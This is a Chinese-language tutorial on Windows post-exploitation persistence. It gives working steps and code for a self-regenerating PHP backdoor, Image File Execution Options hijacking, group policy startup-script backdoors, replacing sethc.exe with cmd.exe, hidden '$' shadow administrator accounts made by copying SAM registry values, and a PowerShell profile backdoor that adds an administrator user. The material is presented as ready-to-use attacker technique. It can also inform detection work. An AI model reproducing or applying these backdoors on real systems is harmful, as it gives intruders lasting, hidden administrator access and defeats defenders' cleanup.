# 权限维持——windows权限维持

## 不死马权限维持

1. php不死马

``` php
<?php ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.
set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去 
$interval = 5; // 每隔*秒运行 
do {
    $filename = 'test.php'; 
    if(file_exists($filename)) { 
        echo "xxx"; 
    }
    else { 
        $file = fopen("test.php", "w"); 
        $txt = "<?php phpinfo();?>\n"; //在此处写入后门代码
    fwrite($file, $txt); 
    fclose($file); 
    }
    sleep($interval); 
} while (true); 
?>
```

2. 上述脚本每隔5秒运行一次，并生成后门文件，若后门文件被删除则会自动重新生成，当apache等中间件重启，则脚本必须重新解析执行一次才可以重新运行

## 映像劫持

1. 修改注册表

   ```  powershell
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options
   ```

2. 在下面添加一项，添加的项的命名与后续要触发的可执行文件程序文件名一致，如1.exe

3. 然后在1.exe的右侧新建一个Debugger，在输入值的栏目中填入后门绝对路径
4. 修改一个文件的文件名为1.exe即可触发后门

## 策略组脚本维持

1. 输入`gpedit.msc` 打开组策略，打开 windows设置 脚本 里面有关机和开机
2. 在`C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup`下添加一个后门脚本
3. 策略组中的windows设置->脚本启动中添加后门脚本

## shift后门

首先 更改sethc.exe拥有者 为administrator

``` powershell
move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bak 
Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
```

接着 cmd改名替换 sethc.exe

## 影子账户

1. 创建一个带$的用户，并添加到本地用户组，通过这种方法添加的用户在cmd中看不到，但是在控制面板中可以看到

   ``` powershell
   net user admin$ passwd /add
   net localgroup administrators admin$ /add
   ```

2. 打开注册表 

   ``` powershell
   HEKY_LOCAL_MACHINE\SAM\SAM\Domains\Account\User
   ```

3. 将1F4下F项的值复制到3ea下F项里面，替换原有数据。然后导出本地用户以及3EB。3ea是添加的本地用户 1F4是超级管理员的值。删除 net user admin$ /del 删除这个用户 再导入注册表，这样控制面板中就看不到这个本地用户了。

## powershell配置文件后门

1. Powershell配置文件其实就是一个powershell脚本，他可以在每次运行powershell的时候自动运行，所以可以通过向该文件写入自定义的语句用来长期维持权限。

2. 依次输入以下命令，查看当前是否存在配置文件。

   ``` powershell
   echo $profile 
   Test-path $profile
   ```

3. 如果返回false则需要创建一个

   ``` powershell
   New-Item -Path $profile -Type File –Force
   ```

4. 然后写入命令，可以创建一个用户为目标，也可以写成反弹shell的

   - 1.bat文件内容

     ``` powershell
     net user moon 123456 /add & net localgroup administrators moon /add
     ```

   - 在powershell控制台中依次输入以下命令，重新打开powershell就会自动执行

     ``` powershell
     $string = 'Start-Process "C:\1.bat"' 
     $string | Out-File -FilePath $profile -Append 
     more $profile
     ```

   

